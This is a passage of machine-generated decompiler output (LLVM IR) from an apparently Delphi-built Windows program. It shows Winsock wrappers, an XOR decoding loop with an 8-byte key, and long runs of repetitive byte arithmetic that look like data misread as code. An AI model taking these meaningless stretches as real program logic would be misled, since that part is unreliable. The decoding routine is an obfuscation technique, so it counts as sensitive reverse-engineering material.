  %0 = call i32 @__readfsdword(i32 0), !insn.addr !224
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !224
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !224
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !225
  %2 = load i32, i32* @global_var_409664, align 4, !insn.addr !226
  %3 = add i32 %2, 1, !insn.addr !226
  store i32 %3, i32* @global_var_409664, align 4, !insn.addr !226
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !227
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !228
  ret i32 0, !insn.addr !229
}

define i32 @function_404639() local_unnamed_addr {
dec_label_pc_404639:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !230
  ret i32 %0, !insn.addr !230
}

define i32 @function_40463e() local_unnamed_addr {
dec_label_pc_40463e:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !231
}

define i32 @function_404640(i32 %arg1) local_unnamed_addr {
dec_label_pc_404640:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !232
}

define i32 @function_404644() local_unnamed_addr {
dec_label_pc_404644:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409664, align 4, !insn.addr !233
  %2 = add i32 %1, -1, !insn.addr !233
  store i32 %2, i32* @global_var_409664, align 4, !insn.addr !233
  ret i32 %0, !insn.addr !234
}

define i32 @function_40464f() local_unnamed_addr {
dec_label_pc_40464f:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %3 = add i32 %1, -1, !insn.addr !235
  %4 = inttoptr i32 %1 to i32*, !insn.addr !235
  store i32 %3, i32* %4, align 4, !insn.addr !235
  %5 = bitcast i32* %eax to i8*
  %6 = load i8, i8* %5, align 4, !insn.addr !236
  %7 = load i32, i32* %eax, align 4
  %8 = trunc i32 %7 to i8, !insn.addr !236
  %9 = add i8 %6, %8, !insn.addr !236
  %10 = inttoptr i32 %7 to i8*, !insn.addr !236
  store i8 %9, i8* %10, align 1, !insn.addr !236
  %11 = add i32 %2, 101, !insn.addr !237
  %12 = inttoptr i32 %11 to i8*, !insn.addr !237
  %13 = load i8, i8* %12, align 1, !insn.addr !237
  %14 = udiv i32 %2, 256, !insn.addr !237
  %15 = trunc i32 %14 to i8, !insn.addr !237
  %16 = add i8 %13, %15, !insn.addr !237
  store i8 %16, i8* %12, align 1, !insn.addr !237
  %17 = add i32 %1, 101, !insn.addr !238
  %18 = inttoptr i32 %17 to i32*, !insn.addr !238
  %19 = load i32, i32* %18, align 4, !insn.addr !238
  %20 = mul i32 %19, 1819042862, !insn.addr !238
  %21 = load i8, i8* %5, align 4, !insn.addr !239
  %22 = add i8 %21, %15, !insn.addr !239
  %23 = load i32, i32* %eax, align 4, !insn.addr !239
  %24 = inttoptr i32 %23 to i8*, !insn.addr !239
  store i8 %22, i8* %24, align 1, !insn.addr !239
  %25 = load i8, i8* %5, align 4, !insn.addr !240
  %26 = load i32, i32* %eax, align 4
  %27 = trunc i32 %26 to i8, !insn.addr !240
  %28 = add i8 %25, %27, !insn.addr !240
  %29 = inttoptr i32 %26 to i8*, !insn.addr !240
  store i8 %28, i8* %29, align 1, !insn.addr !240
  %30 = load i8, i8* %5, align 4, !insn.addr !241
  %31 = load i32, i32* %eax, align 4
  %32 = trunc i32 %31 to i8, !insn.addr !241
  %33 = add i8 %30, %32, !insn.addr !241
  %34 = inttoptr i32 %31 to i8*, !insn.addr !241
  store i8 %33, i8* %34, align 1, !insn.addr !241
  %35 = load i8, i8* %5, align 4, !insn.addr !242
  %36 = load i32, i32* %eax, align 4
  %37 = trunc i32 %36 to i8, !insn.addr !242
  %38 = add i8 %35, %37, !insn.addr !242
  %39 = inttoptr i32 %36 to i8*, !insn.addr !242
  store i8 %38, i8* %39, align 1, !insn.addr !242
  %40 = add i32 %0, -117, !insn.addr !243
  %41 = inttoptr i32 %40 to i8*, !insn.addr !243
  %42 = load i8, i8* %41, align 1, !insn.addr !243
  %43 = trunc i32 %2 to i8, !insn.addr !243
  %44 = add i8 %42, %43, !insn.addr !243
  store i8 %44, i8* %41, align 1, !insn.addr !243
  %45 = trunc i32 %2 to i16, !insn.addr !244
  %46 = call i8 @__asm_in(i16 %45), !insn.addr !244
  %47 = add i32 %20, -8, !insn.addr !245
  %48 = inttoptr i32 %47 to i32*, !insn.addr !245
  store i32 4212417, i32* %48, align 4, !insn.addr !245
  %49 = call i32 @__readfsdword(i32 0), !insn.addr !246
  %50 = add i32 %20, -12, !insn.addr !246
  %51 = inttoptr i32 %50 to i32*, !insn.addr !246
  store i32 %49, i32* %51, align 4, !insn.addr !246
  call void @__writefsdword(i32 0, i32 %50), !insn.addr !247
  %52 = load i32, i32* @global_var_409678, align 4, !insn.addr !248
  %53 = add i32 %52, 1, !insn.addr !248
  %54 = icmp eq i32 %53, 0, !insn.addr !248
  store i32 %53, i32* @global_var_409678, align 4, !insn.addr !248
  %55 = icmp eq i1 %54, false, !insn.addr !249
  br i1 %55, label %dec_label_pc_4046b3, label %dec_label_pc_404681, !insn.addr !249

dec_label_pc_404681:                              ; preds = %dec_label_pc_40464f
  %56 = call i32 @"@LStrClr"(), !insn.addr !250
  %57 = call i32 @"@LStrClr"(), !insn.addr !251
  %58 = call i32 @"@LStrClr"(), !insn.addr !252
  %59 = call i32 @"@LStrClr"(), !insn.addr !253
  %60 = call i32 @"@LStrClr"(), !insn.addr !254
  br label %dec_label_pc_4046b3, !insn.addr !254

dec_label_pc_4046b3:                              ; preds = %dec_label_pc_404681, %dec_label_pc_40464f
  %61 = add i32 %20, -4, !insn.addr !255
  %62 = inttoptr i32 %61 to i32*, !insn.addr !255
  %63 = load i32, i32* %51, align 4, !insn.addr !256
  call void @__writefsdword(i32 0, i32 %63), !insn.addr !257
  store i32 4212424, i32* %62, align 4, !insn.addr !258
  ret i32 0, !insn.addr !259
}

define i32 @function_4046c1() local_unnamed_addr {
dec_label_pc_4046c1:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !260
  ret i32 %0, !insn.addr !260
}

define i32 @function_4046c6() local_unnamed_addr {
dec_label_pc_4046c6:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !261
}

define i32 @function_4046c8(i32 %arg1) local_unnamed_addr {
dec_label_pc_4046c8:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !262
}

define i32 @function_4046cc() local_unnamed_addr {
dec_label_pc_4046cc:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409678, align 4, !insn.addr !263
  %2 = add i32 %1, -1, !insn.addr !263
  store i32 %2, i32* @global_var_409678, align 4, !insn.addr !263
  ret i32 %0, !insn.addr !264
}

define i32 @function_4046d4() local_unnamed_addr {
dec_label_pc_4046d4:
  %eax.1.reg2mem = alloca i32, !insn.addr !265
  %esi.0.reg2mem = alloca i32, !insn.addr !265
  %ebx.0.reg2mem = alloca i32, !insn.addr !265
  %eax.0.reg2mem = alloca i32, !insn.addr !265
  %0 = call i32 @function_403720(), !insn.addr !266
  %1 = call i32 @function_4034c8(), !insn.addr !267
  %2 = icmp slt i32 %1, 1
  store i32 %1, i32* %eax.0.reg2mem, !insn.addr !268
  store i32 0, i32* %ebx.0.reg2mem, !insn.addr !268
  store i32 %0, i32* %esi.0.reg2mem, !insn.addr !268
  store i32 %1, i32* %eax.1.reg2mem, !insn.addr !268
  br i1 %2, label %dec_label_pc_404709, label %dec_label_pc_4046ef, !insn.addr !268

dec_label_pc_4046ef:                              ; preds = %dec_label_pc_4046d4, %dec_label_pc_4046ef
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %3 = add i32 %ebx.0.reload, ptrtoint (i8** @global_var_4080d0 to i32), !insn.addr !269
  %4 = inttoptr i32 %3 to i8*, !insn.addr !269
  %5 = load i8, i8* %4, align 1, !insn.addr !269
  %6 = inttoptr i32 %esi.0.reload to i8*, !insn.addr !270
  %7 = load i8, i8* %6, align 1, !insn.addr !270
  %8 = xor i8 %7, %5, !insn.addr !270
  store i8 %8, i8* %6, align 1, !insn.addr !270
  %9 = add i32 %esi.0.reload, 1, !insn.addr !271
  %10 = add i32 %ebx.0.reload, 1, !insn.addr !272
  %11 = and i32 %10, -2147483641, !insn.addr !273
  %12 = icmp slt i32 %11, 0, !insn.addr !273
  %13 = icmp eq i1 %12, false, !insn.addr !274
  %14 = or i32 %ebx.0.reload, -8
  %15 = add nsw i32 %14, 1
  %ebx.1 = select i1 %13, i32 %11, i32 %15
  %16 = add i32 %eax.0.reload, -1, !insn.addr !275
  %17 = icmp eq i32 %16, 0, !insn.addr !275
  %18 = icmp eq i1 %17, false, !insn.addr !276
  store i32 %16, i32* %eax.0.reg2mem, !insn.addr !276
  store i32 %ebx.1, i32* %ebx.0.reg2mem, !insn.addr !276
  store i32 %9, i32* %esi.0.reg2mem, !insn.addr !276
  store i32 %16, i32* %eax.1.reg2mem, !insn.addr !276
  br i1 %18, label %dec_label_pc_4046ef, label %dec_label_pc_404709, !insn.addr !276

dec_label_pc_404709:                              ; preds = %dec_label_pc_4046ef, %dec_label_pc_4046d4
  %eax.1.reload = load i32, i32* %eax.1.reg2mem
  ret i32 %eax.1.reload, !insn.addr !277
}

define i32 @function_404710() local_unnamed_addr {
dec_label_pc_404710:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !278
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !278
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !278
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !279
  %2 = load i32, i32* @global_var_40967c, align 4, !insn.addr !280
  %3 = add i32 %2, 1, !insn.addr !280
  store i32 %3, i32* @global_var_40967c, align 4, !insn.addr !280
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !281
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !282
  ret i32 0, !insn.addr !283
}

define i32 @function_404735() local_unnamed_addr {
dec_label_pc_404735:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !284
  ret i32 %0, !insn.addr !284
}

define i32 @function_40473a() local_unnamed_addr {
dec_label_pc_40473a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !285
}

define i32 @function_40473c(i32 %arg1) local_unnamed_addr {
dec_label_pc_40473c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !286
}

define i32 @function_404740() local_unnamed_addr {
dec_label_pc_404740:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_40967c, align 4, !insn.addr !287
  %2 = add i32 %1, -1, !insn.addr !287
  store i32 %2, i32* @global_var_40967c, align 4, !insn.addr !287
  ret i32 %0, !insn.addr !288
}

define i32 @function_404748() local_unnamed_addr {
dec_label_pc_404748:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !289
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !289
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !289
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !290
  %2 = load i32, i32* @global_var_409680, align 4, !insn.addr !291
  %3 = add i32 %2, 1, !insn.addr !291
  store i32 %3, i32* @global_var_409680, align 4, !insn.addr !291
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !292
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !293
  ret i32 0, !insn.addr !294
}

define i32 @function_40476d() local_unnamed_addr {
dec_label_pc_40476d:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !295
  ret i32 %0, !insn.addr !295
}

define i32 @function_404772() local_unnamed_addr {
dec_label_pc_404772:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !296
}

define i32 @function_404774(i32 %arg1) local_unnamed_addr {
dec_label_pc_404774:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !297
}

define i32 @function_404778() local_unnamed_addr {
dec_label_pc_404778:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409680, align 4, !insn.addr !298
  %2 = add i32 %1, -1, !insn.addr !298
  store i32 %2, i32* @global_var_409680, align 4, !insn.addr !298
  ret i32 %0, !insn.addr !299
}

define i32 @function_404780(i32 %s) local_unnamed_addr {
dec_label_pc_404780:
  %0 = call i32 @closesocket(i32 %s), !insn.addr !300
  ret i32 %0, !insn.addr !300
}

define i32 @function_404788(i32 %s, %sockaddr* %name, i32 %namelen) local_unnamed_addr {
dec_label_pc_404788:
  %0 = call i32 @connect(i32 %s, %sockaddr* %name, i32 %namelen), !insn.addr !301
  ret i32 %0, !insn.addr !301
}

define i16 @function_404790(i16 %hostshort) local_unnamed_addr {
dec_label_pc_404790:
  %0 = call i16 @htons(i16 %hostshort), !insn.addr !302
  ret i16 %0, !insn.addr !302
}

define i8* @function_404798(%in_addr %in) local_unnamed_addr {
dec_label_pc_404798:
  %0 = call i8* @inet_ntoa(%in_addr %in), !insn.addr !303
  ret i8* %0, !insn.addr !303
}

define i32 @function_4047a0(i32 %s, i8* %buf, i32 %len, i32 %flags) local_unnamed_addr {
dec_label_pc_4047a0:
  %0 = call i32 @recv(i32 %s, i8* %buf, i32 %len, i32 %flags), !insn.addr !304
  ret i32 %0, !insn.addr !304
}

define i32 @function_4047a8(i32 %s, i8* %buf, i32 %len, i32 %flags) local_unnamed_addr {
dec_label_pc_4047a8:
  %0 = call i32 @send(i32 %s, i8* %buf, i32 %len, i32 %flags), !insn.addr !305
  ret i32 %0, !insn.addr !305
}

define i32 @function_4047b0(i32 %af, i32 %type, i32 %protocol) local_unnamed_addr {
dec_label_pc_4047b0:
  %0 = call i32 @socket(i32 %af, i32 %type, i32 %protocol), !insn.addr !306
  ret i32 %0, !insn.addr !306
}

define %hostent* @function_4047b8(i8* %name) local_unnamed_addr {
dec_label_pc_4047b8:
  %0 = call %hostent* @gethostbyname(i8* %name), !insn.addr !307
  ret %hostent* %0, !insn.addr !307
}

define i32 @function_4047c0(i8* %name, i32 %namelen) local_unnamed_addr {
dec_label_pc_4047c0:
  %0 = call i32 @gethostname(i8* %name, i32 %namelen), !insn.addr !308
  ret i32 %0, !insn.addr !308
}

define i32 @function_4047c8(i16 %wVersionRequested, %WSAData* %lpWSAData) local_unnamed_addr {
dec_label_pc_4047c8:
  %0 = call i32 @WSAStartup(i16 %wVersionRequested, %WSAData* %lpWSAData), !insn.addr !309
  ret i32 %0, !insn.addr !309
}

define i32 @function_4047d0() local_unnamed_addr {
dec_label_pc_4047d0:
  %0 = call i32 @WSACleanup(), !insn.addr !310
  ret i32 %0, !insn.addr !310
}

define i32 @function_4047d8() local_unnamed_addr {
dec_label_pc_4047d8:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !311
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !311
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !311
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !312
  %2 = load i32, i32* @global_var_409684, align 4, !insn.addr !313
  %3 = add i32 %2, 1, !insn.addr !313
  store i32 %3, i32* @global_var_409684, align 4, !insn.addr !313
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !314
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !315
  ret i32 0, !insn.addr !316
}

define i32 @function_4047fd() local_unnamed_addr {
dec_label_pc_4047fd:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !317
  ret i32 %0, !insn.addr !317
}

define i32 @function_404802() local_unnamed_addr {
dec_label_pc_404802:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !318
}

define i32 @function_404804(i32 %arg1) local_unnamed_addr {
dec_label_pc_404804:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !319
}

define i32 @function_404808() local_unnamed_addr {
dec_label_pc_404808:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409684, align 4, !insn.addr !320
  %2 = add i32 %1, -1, !insn.addr !320
  store i32 %2, i32* @global_var_409684, align 4, !insn.addr !320
  ret i32 %0, !insn.addr !321
}

define i32 @function_404810(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_404810:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %3 = bitcast i32* %eax to i8*
  %4 = load i8, i8* %3, align 4, !insn.addr !322
  %5 = load i32, i32* %eax, align 4
  %6 = trunc i32 %5 to i8, !insn.addr !322
  %7 = add i8 %4, %6, !insn.addr !322
  %8 = inttoptr i32 %5 to i8*, !insn.addr !322
  store i8 %7, i8* %8, align 1, !insn.addr !322
  %9 = load i8, i8* %3, align 4, !insn.addr !323
  %10 = load i32, i32* %eax, align 4
  %11 = trunc i32 %10 to i8, !insn.addr !323
  %12 = add i8 %9, %11, !insn.addr !323
  %13 = inttoptr i32 %10 to i8*, !insn.addr !323
  store i8 %12, i8* %13, align 1, !insn.addr !323
  %14 = load i8, i8* %3, align 4, !insn.addr !324
  %15 = load i32, i32* %eax, align 4
  %16 = trunc i32 %15 to i8, !insn.addr !324
  %17 = add i8 %14, %16, !insn.addr !324
  %18 = inttoptr i32 %15 to i8*, !insn.addr !324
  store i8 %17, i8* %18, align 1, !insn.addr !324
  %19 = load i8, i8* %3, align 4, !insn.addr !325
  %20 = load i32, i32* %eax, align 4
  %21 = trunc i32 %20 to i8, !insn.addr !325
  %22 = add i8 %19, %21, !insn.addr !325
  %23 = inttoptr i32 %20 to i8*, !insn.addr !325
  store i8 %22, i8* %23, align 1, !insn.addr !325
  %24 = load i8, i8* %3, align 4, !insn.addr !326
  %25 = load i32, i32* %eax, align 4
  %26 = trunc i32 %25 to i8, !insn.addr !326
  %27 = add i8 %24, %26, !insn.addr !326
  %28 = inttoptr i32 %25 to i8*, !insn.addr !326
  store i8 %27, i8* %28, align 1, !insn.addr !326
  %29 = load i8, i8* %3, align 4, !insn.addr !327
  %30 = load i32, i32* %eax, align 4
  %31 = trunc i32 %30 to i8, !insn.addr !327
  %32 = add i8 %29, %31, !insn.addr !327
  %33 = inttoptr i32 %30 to i8*, !insn.addr !327
  store i8 %32, i8* %33, align 1, !insn.addr !327
  %34 = load i8, i8* %3, align 4, !insn.addr !328
  %35 = load i32, i32* %eax, align 4
  %36 = trunc i32 %35 to i8, !insn.addr !328
  %37 = add i8 %34, %36, !insn.addr !328
  %38 = inttoptr i32 %35 to i8*, !insn.addr !328
  store i8 %37, i8* %38, align 1, !insn.addr !328
  %39 = load i8, i8* %3, align 4, !insn.addr !329
  %40 = load i32, i32* %eax, align 4
  %41 = trunc i32 %40 to i8, !insn.addr !329
  %42 = add i8 %39, %41, !insn.addr !329
  %43 = inttoptr i32 %40 to i8*, !insn.addr !329
  store i8 %42, i8* %43, align 1, !insn.addr !329
  %44 = load i8, i8* %3, align 4, !insn.addr !330
  %45 = load i32, i32* %eax, align 4
  %46 = trunc i32 %45 to i8, !insn.addr !330
  %47 = add i8 %44, %46, !insn.addr !330
  %48 = inttoptr i32 %45 to i8*, !insn.addr !330
  store i8 %47, i8* %48, align 1, !insn.addr !330
  %49 = load i8, i8* %3, align 4, !insn.addr !331
  %50 = load i32, i32* %eax, align 4
  %51 = trunc i32 %50 to i8, !insn.addr !331
  %52 = add i8 %49, %51, !insn.addr !331
  %53 = inttoptr i32 %50 to i8*, !insn.addr !331
  store i8 %52, i8* %53, align 1, !insn.addr !331
  %54 = load i8, i8* %3, align 4, !insn.addr !332
  %55 = load i32, i32* %eax, align 4
  %56 = trunc i32 %55 to i8, !insn.addr !332
  %57 = add i8 %54, %56, !insn.addr !332
  %58 = inttoptr i32 %55 to i8*, !insn.addr !332
  store i8 %57, i8* %58, align 1, !insn.addr !332
  %59 = load i8, i8* %3, align 4, !insn.addr !333
  %60 = load i32, i32* %eax, align 4
  %61 = trunc i32 %60 to i8, !insn.addr !333
  %62 = add i8 %59, %61, !insn.addr !333
  %63 = inttoptr i32 %60 to i8*, !insn.addr !333
  store i8 %62, i8* %63, align 1, !insn.addr !333
  %64 = load i8, i8* %3, align 4, !insn.addr !334
  %65 = load i32, i32* %eax, align 4
  %66 = trunc i32 %65 to i8, !insn.addr !334
  %67 = add i8 %64, %66, !insn.addr !334
  %68 = inttoptr i32 %65 to i8*, !insn.addr !334
  store i8 %67, i8* %68, align 1, !insn.addr !334
  %69 = load i8, i8* %3, align 4, !insn.addr !335
  %70 = load i32, i32* %eax, align 4
  %71 = trunc i32 %70 to i8, !insn.addr !335
  %72 = add i8 %69, %71, !insn.addr !335
  %73 = inttoptr i32 %70 to i8*, !insn.addr !335
  store i8 %72, i8* %73, align 1, !insn.addr !335
  %74 = load i8, i8* %3, align 4, !insn.addr !336
  %75 = load i32, i32* %eax, align 4
  %76 = trunc i32 %75 to i8, !insn.addr !336
  %77 = add i8 %74, %76, !insn.addr !336
  %78 = inttoptr i32 %75 to i8*, !insn.addr !336
  store i8 %77, i8* %78, align 1, !insn.addr !336
  %79 = load i8, i8* %3, align 4, !insn.addr !337
  %80 = load i32, i32* %eax, align 4
  %81 = trunc i32 %80 to i8, !insn.addr !337
  %82 = add i8 %79, %81, !insn.addr !337
  %83 = inttoptr i32 %80 to i8*, !insn.addr !337
  store i8 %82, i8* %83, align 1, !insn.addr !337
  %84 = load i8, i8* %3, align 4, !insn.addr !338
  %85 = load i32, i32* %eax, align 4
  %86 = trunc i32 %85 to i8, !insn.addr !338
  %87 = add i8 %84, %86, !insn.addr !338
  %88 = inttoptr i32 %85 to i8*, !insn.addr !338
  store i8 %87, i8* %88, align 1, !insn.addr !338
  %89 = load i8, i8* %3, align 4, !insn.addr !339
  %90 = load i32, i32* %eax, align 4
  %91 = trunc i32 %90 to i8, !insn.addr !339
  %92 = add i8 %89, %91, !insn.addr !339
  %93 = inttoptr i32 %90 to i8*, !insn.addr !339
  store i8 %92, i8* %93, align 1, !insn.addr !339
  %94 = load i8, i8* %3, align 4, !insn.addr !340
  %95 = load i32, i32* %eax, align 4
  %96 = trunc i32 %95 to i8, !insn.addr !340
  %97 = add i8 %94, %96, !insn.addr !340
  %98 = inttoptr i32 %95 to i8*, !insn.addr !340
  store i8 %97, i8* %98, align 1, !insn.addr !340
  %99 = load i8, i8* %3, align 4, !insn.addr !341
  %100 = load i32, i32* %eax, align 4
  %101 = trunc i32 %100 to i8, !insn.addr !341
  %102 = add i8 %99, %101, !insn.addr !341
  %103 = inttoptr i32 %100 to i8*, !insn.addr !341
  store i8 %102, i8* %103, align 1, !insn.addr !341
  %104 = load i8, i8* %3, align 4, !insn.addr !342
  %105 = load i32, i32* %eax, align 4
  %106 = trunc i32 %105 to i8, !insn.addr !342
  %107 = add i8 %104, %106, !insn.addr !342
  %108 = inttoptr i32 %105 to i8*, !insn.addr !342
  store i8 %107, i8* %108, align 1, !insn.addr !342
  %109 = load i8, i8* %3, align 4, !insn.addr !343
  %110 = load i32, i32* %eax, align 4
  %111 = trunc i32 %110 to i8, !insn.addr !343
  %112 = add i8 %109, %111, !insn.addr !343
  %113 = inttoptr i32 %110 to i8*, !insn.addr !343
  store i8 %112, i8* %113, align 1, !insn.addr !343
  %114 = load i8, i8* %3, align 4, !insn.addr !344
  %115 = load i32, i32* %eax, align 4
  %116 = trunc i32 %115 to i8, !insn.addr !344
  %117 = add i8 %114, %116, !insn.addr !344
  %118 = inttoptr i32 %115 to i8*, !insn.addr !344
  store i8 %117, i8* %118, align 1, !insn.addr !344
  %119 = load i8, i8* %3, align 4, !insn.addr !345
  %120 = load i32, i32* %eax, align 4
  %121 = trunc i32 %120 to i8, !insn.addr !345
  %122 = add i8 %119, %121, !insn.addr !345
  %123 = inttoptr i32 %120 to i8*, !insn.addr !345
  store i8 %122, i8* %123, align 1, !insn.addr !345
  %124 = load i8, i8* %3, align 4, !insn.addr !346
  %125 = load i32, i32* %eax, align 4
  %126 = trunc i32 %125 to i8, !insn.addr !346
  %127 = add i8 %124, %126, !insn.addr !346
  %128 = inttoptr i32 %125 to i8*, !insn.addr !346
  store i8 %127, i8* %128, align 1, !insn.addr !346
  %129 = load i8, i8* %3, align 4, !insn.addr !347
  %130 = load i32, i32* %eax, align 4
  %131 = trunc i32 %130 to i8, !insn.addr !347
  %132 = add i8 %129, %131, !insn.addr !347
  %133 = inttoptr i32 %130 to i8*, !insn.addr !347
  store i8 %132, i8* %133, align 1, !insn.addr !347
  %134 = load i8, i8* %3, align 4, !insn.addr !348
  %135 = load i32, i32* %eax, align 4
  %136 = trunc i32 %135 to i8, !insn.addr !348
  %137 = add i8 %134, %136, !insn.addr !348
  %138 = inttoptr i32 %135 to i8*, !insn.addr !348
  store i8 %137, i8* %138, align 1, !insn.addr !348
  %139 = load i8, i8* %3, align 4, !insn.addr !349
  %140 = load i32, i32* %eax, align 4
  %141 = trunc i32 %140 to i8, !insn.addr !349
  %142 = add i8 %139, %141, !insn.addr !349
  %143 = inttoptr i32 %140 to i8*, !insn.addr !349
  store i8 %142, i8* %143, align 1, !insn.addr !349
  %144 = load i8, i8* %3, align 4, !insn.addr !350
  %145 = load i32, i32* %eax, align 4
  %146 = trunc i32 %145 to i8, !insn.addr !350
  %147 = add i8 %144, %146, !insn.addr !350
  %148 = inttoptr i32 %145 to i8*, !insn.addr !350
  store i8 %147, i8* %148, align 1, !insn.addr !350
  %149 = load i8, i8* %3, align 4, !insn.addr !351
  %150 = load i32, i32* %eax, align 4
  %151 = trunc i32 %150 to i8, !insn.addr !351
  %152 = add i8 %149, %151, !insn.addr !351
  %153 = inttoptr i32 %150 to i8*, !insn.addr !351
  store i8 %152, i8* %153, align 1, !insn.addr !351
  %154 = load i8, i8* %3, align 4, !insn.addr !352
  %155 = load i32, i32* %eax, align 4
  %156 = trunc i32 %155 to i8, !insn.addr !352
  %157 = add i8 %154, %156, !insn.addr !352
  %158 = inttoptr i32 %155 to i8*, !insn.addr !352
  store i8 %157, i8* %158, align 1, !insn.addr !352
  %159 = load i8, i8* %3, align 4, !insn.addr !353
  %160 = load i32, i32* %eax, align 4
  %161 = trunc i32 %160 to i8, !insn.addr !353
  %162 = add i8 %159, %161, !insn.addr !353
  %163 = inttoptr i32 %160 to i8*, !insn.addr !353
  store i8 %162, i8* %163, align 1, !insn.addr !353
  %164 = load i8, i8* %3, align 4, !insn.addr !354
  %165 = load i32, i32* %eax, align 4
  %166 = trunc i32 %165 to i8, !insn.addr !354
  %167 = add i8 %164, %166, !insn.addr !354
  %168 = inttoptr i32 %165 to i8*, !insn.addr !354
  store i8 %167, i8* %168, align 1, !insn.addr !354
  %169 = load i8, i8* %3, align 4, !insn.addr !355
  %170 = load i32, i32* %eax, align 4
  %171 = trunc i32 %170 to i8, !insn.addr !355
  %172 = add i8 %169, %171, !insn.addr !355
  %173 = icmp ult i8 %172, %169, !insn.addr !355
  %174 = inttoptr i32 %170 to i8*, !insn.addr !355
  store i8 %172, i8* %174, align 1, !insn.addr !355
  br i1 %173, label %dec_label_pc_4048c8, label %dec_label_pc_404856, !insn.addr !356

dec_label_pc_404856:                              ; preds = %dec_label_pc_404810
  %175 = load i32, i32* %eax, align 4
  %176 = load i32, i32* inttoptr (i32 842347570 to i32*), align 4, !insn.addr !357
  %177 = xor i32 %176, %0, !insn.addr !357
  store i32 %177, i32* inttoptr (i32 842347570 to i32*), align 4, !insn.addr !357
  %178 = xor i32 %175, 876032631, !insn.addr !358
  store i32 %178, i32* %eax, align 4, !insn.addr !358
  %179 = inttoptr i32 %178 to i8*, !insn.addr !359
  %180 = load i8, i8* %179, align 1, !insn.addr !359
  %181 = trunc i32 %178 to i8, !insn.addr !359
  %factor = mul i8 %181, 23
  %182 = add i8 %180, %factor, !insn.addr !360
  %183 = add i8 %182, %181, !insn.addr !361
  %184 = icmp ult i8 %183, %182, !insn.addr !361
  store i8 %183, i8* %179, align 1, !insn.addr !361
  %185 = load i32, i32* %eax, align 4
  br i1 %184, label %dec_label_pc_40490c, label %dec_label_pc_40489a, !insn.addr !362

dec_label_pc_40489a:                              ; preds = %dec_label_pc_404856
  %186 = load i32, i32* inttoptr (i32 842347570 to i32*), align 4, !insn.addr !363
  %187 = xor i32 %186, %0, !insn.addr !363
  store i32 %187, i32* inttoptr (i32 842347570 to i32*), align 4, !insn.addr !363
  %188 = xor i32 %185, 876032631, !insn.addr !364
  store i32 %188, i32* %eax, align 4, !insn.addr !364
  %189 = inttoptr i32 %188 to i8*, !insn.addr !365
  %190 = load i8, i8* %189, align 1, !insn.addr !365
  %191 = trunc i32 %188 to i8, !insn.addr !365
  %factor1 = mul i8 %191, 14
  %192 = add i8 %190, %factor1, !insn.addr !366
  store i8 %192, i8* %189, align 1, !insn.addr !366
  br label %dec_label_pc_4048c8, !insn.addr !366

dec_label_pc_4048c8:                              ; preds = %dec_label_pc_40489a, %dec_label_pc_404810
  %193 = load i32, i32* %eax, align 4
  %194 = inttoptr i32 %193 to i8*, !insn.addr !367
  %195 = load i8, i8* %194, align 1, !insn.addr !367
  %196 = trunc i32 %193 to i8, !insn.addr !367
  %197 = add i8 %195, %196, !insn.addr !367
  store i8 %197, i8* %194, align 1, !insn.addr !367
  %198 = load i32, i32* %eax, align 4
